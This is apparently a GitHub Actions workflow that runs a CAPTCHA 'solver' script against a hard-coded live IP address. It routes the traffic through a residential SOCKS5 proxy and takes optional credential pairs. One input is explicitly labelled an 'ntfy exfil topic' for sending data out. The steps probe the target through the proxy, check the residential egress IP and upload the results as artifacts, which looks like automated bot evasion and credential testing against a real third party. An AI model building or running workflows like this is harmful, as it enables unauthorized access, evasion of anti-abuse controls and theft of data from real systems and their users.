name: i53683turnstile
on:
  workflow_dispatch:
    inputs:
      nt:
        description: "ntfy exfil topic"
        required: false
        default: ""
      proxy:
        description: "residential socks5 ip:port"
        required: false
        default: "193.218.118.128:1080"
      creds:
        description: "JSON credential pairs (optional)"
        required: false
        default: ""
permissions:
  contents: read
jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - name: egress info + confirm socks5 proxy path to target (FIRST check)
        env:
          PX: ${{ github.event.inputs.proxy }}
        run: |
          echo "=== runner info ==="; id; uname -a
          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/RUNNER_EGRESS_IP=/'
          P="${PX:-193.218.118.128:1080}"
          echo "=== via socks5h $P -> target /api/status ==="
          curl -s -m 30 --socks5-hostname "$P" -o /dev/null -w "target_via_proxy_http=%{http_code} time=%{time_total}\n" http://135.148.204.37/api/status || echo "proxy->target FAILED"
          echo "=== via socks5h $P -> ipify (residential egress?) ==="
          curl -s -m 25 --socks5-hostname "$P" https://api.ipify.org || echo "proxy->ipify FAILED"; echo
      - name: install deps (xvfb + real chrome + playwright)
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
          python3 -m pip install --quiet --upgrade pip
          python3 -m pip install --quiet playwright
          python3 -m playwright install --with-deps chromium 2>&1 | tail -3
          echo "=== chrome present? ==="; (google-chrome --version || chromium --version || echo no-system-chrome) 2>&1 | head -2
      - name: run solver
        env:
          PROXY: ${{ github.event.inputs.proxy }}
          NT: ${{ github.event.inputs.nt }}
          CREDS: ${{ github.event.inputs.creds }}
          TARGET: "http://135.148.204.37"
        run: |
          PROXY="${PROXY:-193.218.118.128:1080}"
          xvfb-run -a --server-args="-screen 0 1280x900x24" python3 rsolve53683.py
      - name: upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: diag
          path: |
            r53683.json
            *.png
          if-no-files-found: ignore
